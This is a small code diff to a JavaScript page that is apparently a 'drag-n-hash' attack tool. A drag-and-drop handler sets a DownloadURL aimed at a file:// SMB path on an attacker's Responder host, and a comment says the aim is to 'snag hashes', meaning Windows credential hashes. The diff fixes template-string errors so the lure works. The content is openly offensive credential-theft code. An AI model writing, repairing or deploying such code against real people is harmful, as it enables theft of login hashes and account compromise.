@@ -31,9 +31,9 @@
 			const ip = document.getElementById('responder-ip').value.trim() || "127.0.0.1";
 			const sharePath = `file://${ip}/SHARE/dragnhash.png`;
 			// This is the magic that points to our Responder hoping to snag hashes
-			e.dataTransfer.setData("DownloadURL", `image/png:dragnhash.png:${{sharePath}}`);
+			e.dataTransfer.setData("DownloadURL", `image/png:dragnhash.png:${sharePath}`);
 
-			console.log(`Dragging image file to ${sharePath`);
+			console.log(`Dragging image file to ${sharePath}`);
 		});
 
 
